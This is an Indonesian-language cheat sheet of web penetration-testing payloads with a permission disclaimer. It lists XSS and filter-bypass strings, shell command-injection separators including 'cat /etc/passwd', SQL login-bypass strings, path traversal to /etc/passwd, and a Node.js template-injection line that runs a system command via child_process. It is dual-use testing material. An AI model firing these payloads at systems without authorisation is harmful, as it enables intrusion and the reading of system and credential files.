# Security Testing Payloads

Daftar payload ini digunakan untuk pengujian keamanan (penetration testing) pada aplikasi web Anda sendiri. **Hanya gunakan pada sistem yang Anda miliki izin untuk mengujinya.**

## 1. Cross-Site Scripting (XSS)
Gunakan payload ini pada input form, parameter URL, atau area di mana input pengguna ditampilkan kembali.

### Basic Stored/Reflected XSS
```javascript
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
```

### Polyglot (Mencoba bypass filter)
```javascript
javascript://%250Aalert(1)//"
/*\`/*`/*</title>/</textarea></style></noscript></script>--!><img src=x onerror=alert(1)>
```

### Attribute Injection
```javascript
" onmouseover=alert(1) //
" autofocus onfocus=alert(1) //
```

## 2. Command Injection (OS Injection)
Sangat relevan jika aplikasi menggunakan `exec`, `spawn`, atau berinteraksi dengan shell (seperti PM2). Coba pada input yang mungkin diproses sistem.

### Basic Separators
```bash
; id
| id
|| id
& id
&& id
$(id)
`id`
```

### OOB (Out of Band) Testing (Jika output tidak terlihat)
```bash
; sleep 10
| sleep 10
; ping -c 3 127.0.0.1
```

### Polyglots
```bash
& ping -c 10 127.0.0.1 &
; cat /etc/passwd
```

## 3. SQL Injection (SQLi)
Jika aplikasi menggunakan database.

### Authentication Bypass
```sql
' OR '1'='1
' OR 1=1 --
admin' --
admin' #
' OR 1=1 LIMIT 1 --
```

### Generic Error Based
```sql
'
"
''
""
`
```

## 4. Path Traversal (Local File Inclusion)
Coba pada parameter yang meminta nama file atau path.

```text
../../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
/var/www/html/../../etc/passwd
```

## 5. Server-Side Template Injection (SSTI)
Jika menggunakan template engine seperti EJS, Pug, Handlebars, Jinja2.

### Generic
```text
{{7*7}}
${7*7}
<%= 7*7 %>
{{config}}
```

### Node.js (EJS/Pug specific potential)
```javascript
global.process.mainModule.require('child_process').execSync('id').toString()
```

## 6. Access Control & Logic
- Coba akses endpoint API tanpa login.
- Coba ubah ID pengguna di URL/Request Body (IDOR).
- Coba akses file sensitif: `.env`, `.git/HEAD`, `package.json`.

## Cara Menggunakan
1. Masukkan payload ke dalam kolom input (Login, Search, Form Data).
2. Perhatikan respon aplikasi:
   - Apakah muncul popup alert? (XSS)
   - Apakah aplikasi menjadi lambat (misal sleep)? (Command Injection)
   - Apakah muncul error database? (SQLi)
   - Apakah terlihat isi file sistem? (LFI)
